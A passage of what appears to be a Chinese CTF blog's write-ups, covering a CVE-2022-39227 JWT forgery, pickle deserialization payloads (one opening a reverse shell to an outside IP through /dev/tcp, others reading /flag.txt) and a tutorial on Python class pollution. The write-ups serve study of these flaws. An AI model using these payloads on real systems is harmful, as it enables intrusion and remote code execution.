class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>一开始会返回一个jwt token 这里涉及到一个cve的利用</p><p>CVE-2022-39227</p><p>直接用网上的利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_encode, base64url_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    <span class="built_in">print</span>(parsed_payload)</span><br><span class="line">    parsed_payload[<span class="string">&quot;role&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)))</span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="built_in">print</span>(fake_payload)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(topic(<span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxNDA5MjEsImlhdCI6MTcwOTEzNzMyMSwianRpIjoic0t1bEt5Q0VJSXFORDN2R3pKeGVqdyIsIm5iZiI6MTcwOTEzNzMyMSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.OfLoye4xwPW_8a7iakPPOXc9ki4EcbfTMG4Swm0Bo_9p6Wv5ZM0hGimwUKgweMNEsnUl6xXi47QIEaUSc2tS2CIchYHJs3quH0odaQoxlulyE3IOYh0-NzQfTymeqsmbejweyEQ1FiRjKyBgVNFL7eZa8ESp_2CIzeYmCmaaTjDfwVhgm7O6wTfwVoX4qjtPitQ-NWaSQ3lwQtXyveOGx3mqWiWY2d_STalqDv3bnUNyOkxXywkOpYM-OtVzY48lTD7m3BQTHLQ93C_3QYOHk_KzMDitnsekdC3gw3eDYdiVq8BruDgXrKHK7lxVBvvVFRv-NIwoO-E7wK1ukzC0gg&#x27;</span>))</span><br></pre></td></tr></table></figure><p>将结果作为参数token的值,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?token=&#123;&quot; eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDkxNDA2NDQsImlhdCI6MTcwOTEzNzA0NCwianRpIjoiNTZIUkVWbGgwNzgyb3JuNWhlRGY1dyIsIm5iZiI6MTcwOTEzNzA0NCwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9&quot;, &quot;payload&quot;:&quot;eyJleHAiOjE3MDkxNDA2NDQsImlhdCI6MTcwOTEzNzA0NCwianRpIjoiNTZIUkVWbGgwNzgyb3JuNWhlRGY1dyIsIm5iZiI6MTcwOTEzNzA0NCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9&quot;,&quot;signature&quot;:&quot;OXsPZvXsGqKReQFv9FMYwneKop1D757MA1WmPG4IsOze9An4tQtDGu3zycahr6EL0Xn-rcToH0hGyH4i9dt3jnWPxNTrqR1QRIclAOeGinN9wBnxyECNZf8_0gBGhazgvSdB2lHwLsuVoR2mSMndPhCMz9oJPATVqmpfhveYiT9N7uGTUJbbrXXaEF3BPU2T0vOChhDmqZGUw93qy5lIkxMhnSa6plSPovDdBv1aUKmWoGmy_TRAkFesL1NKjv7Wi0QjdcUge96Fv3mmqMp9_G-iafz7u9Ot-YyJ9VsOGqi_vBov6fTFZnJSzAwv49DgIeuVxa2sKtzR8970nk_owg&quot;&#125;</span><br></pre></td></tr></table></figure><p>会返回一个session, 就是admin的session</p><p>此时就可以取pickle这个路由下进行pickle</p><p>这里不会回显, 因此需要使用opcode构造一个反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/107.148.75.202/1234 0&gt;&amp;1\&quot;&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = base64.b64encode(opcode)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>b’Y29zCnN5c3RlbQooUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwNy4xNDguNzUuMjAyLzEyMzQgMD4mMSInCnRSLg&#x3D;&#x3D;’</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pickle?pickle=Y29zCnN5c3RlbQooUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwNy4xNDguNzUuMjAyLzEyMzQgMD4mMSInCnRSLg==</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>300e864c-da01-4bab-9750-6b5949530b2c.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJyb2xlIjoiYWRtaW4ifQ.Zd9egg.OdEGNtZQIeC9-nt3MzZmcX_uDRY</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229004733728.png" alt="image-20240229004733728"></p><p>得到flag</p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>进去后可以注册登录, 这些地方都测不出什么漏洞</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229133317018.png" alt="image-20240229133317018"></p><p>看了半天, 这里要求买到lv6, 翻了几页都没有lv6, 在static&#x2F;img目录下lv6.png确实存在. 这里需要用python脚本跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://e1b204f5-1beb-46b5-bf6b-9362c6510dfe.node5.buuoj.cn:81/shop?page=&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    res = requests.get(url=url.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line">   <span class="comment"># print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到lv6.png在page&#x3D;181</p><p>之后是修改折扣信息来购买</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160429059.png" alt="image-20240229160429059"></p><p>将dicount修改为一个很小的数</p><p>访问返回的&#x2F;b1g_m4mber提示需要admin, 这里用<a href="https://jwt.io/">https://jwt.io/</a> 和c-jwt-cracker 来伪造jwt</p><p>jwt 私钥破解</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229150958381.png" alt="image-20240229150958381"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160701863.png" alt="image-20240229160701863"></p><p>之后可以找到一个网站备份</p><p>涉及pickle的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (os.listdir,(<span class="string">&quot;/&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(a))</span><br></pre></td></tr></table></figure><p>这里要在python2环境下进行, python3里生成的payload并不奏效</p><p>这里并不能使用os.system来执行命令, 不知道为什么..</p><p>生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229160938342.png" alt="image-20240229160938342"></p><p>读取flag.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;rb&#x27;).read()&quot;</span>,))</span><br><span class="line"> </span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(a))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240229161110656.png" alt="image-20240229161110656"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pickle反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 原链污染(类污染)</title>
      <link href="/2024/02/27/Python-%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/02/27/Python-%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-原链污染-类污染"><a href="#Python-原链污染-类污染" class="headerlink" title="Python 原链污染(类污染)"></a>Python 原链污染(类污染)</h1><p>与JavaScript原型链污染类似, python也存在原型链污染的问题</p><p>不同的是, python的原型链污染其实是类污染, 并且__只能污染一些类属性, 而对类方法无效__</p><p>之前学习ssti是就知道 python可以通过一些魔术方法,类方法,类属性层层访问,直到调用到一些危险函数</p><p>因此python也存在链式访问,更改属性等问题</p><h2 id="merge函数"><a href="#merge函数" class="headerlink" title="merge函数"></a>merge函数</h2><p>在Javascript中, 最为常见的就是属性合并函数(merge)造成的原型链污染</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就造成了键值对可控,使得可以对父类的属性和方法进行污染修改</p><p>在python中, 也存在这样的merge函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:<span class="comment"># 若v仍然是一个字典, 递归地将其复制到dst中</span></span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)<span class="comment"># 将src下的k v添加到dst中</span></span><br></pre></td></tr></table></figure><h2 id="污染例子"><a href="#污染例子" class="headerlink" title="污染例子"></a>污染例子</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">tmp = son_a()</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="built_in">print</span>(tmp.secret)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">merge(payload, tmp)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment"># hello</span></span><br><span class="line"><span class="comment"># hello</span></span><br><span class="line"><span class="comment"># world</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里通过tmp.__class__.__base__将其父类(father类)下的secret属性更改造成污染</span><br></pre></td></tr></table></figure><p>同样的, 通过这种方法可以修改python的内置属性</p><blockquote><p><code>__str__</code> 是一个特殊方法（特殊方法也称为魔法方法或魔术方法）之一，在 Python 类中用于定义对象的字符串表示形式。当你调用内置的 <code>str()</code> 函数或 <code>print()</code> 函数来显示一个对象时，实际上是调用了该对象的 <code>__str__</code> 方法。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k)) </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;father&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">tmp = son_a()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;polluted!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line">merge(payload, tmp)</span><br><span class="line"><span class="built_in">print</span>(father.__str__)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># father</span></span><br><span class="line"><span class="comment"># polluted!</span></span><br></pre></td></tr></table></figure><h2 id="无法污染的object属性"><a href="#无法污染的object属性" class="headerlink" title="无法污染的object属性"></a>无法污染的object属性</h2><p>尝试污染Object属性时, 将会提示错误</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__str__&quot;</span>: <span class="string">&quot;pollution!&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment"># TypeError: cannot set &#x27;__str__&#x27; attribute of immutable type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="全局变量获取"><a href="#全局变量获取" class="headerlink" title="全局变量获取"></a>全局变量获取</h2><blockquote><p>在<code>Python</code>中，函数或类方法（对于类的内置方法如<code>__init__</code>这些来说，内置方法在并未重写时其数据类型为装饰器即<code>wrapper_descriptor</code>，只有在重写后才是函数<code>function</code>）均具有一个<code>__globals__</code>属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的<code>globals</code>函数的返回值</p></blockquote><p><strong>_<em>globals</em>_</strong></p><blockquote><p><code>__globals__</code> 是 Python 函数对象（function object）的一个属性，用于获取函数定义时所在的全局命名空间（global namespace）。该属性返回一个字典，表示函数在定义时的全局命名空间中的符号表（symbol table）。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 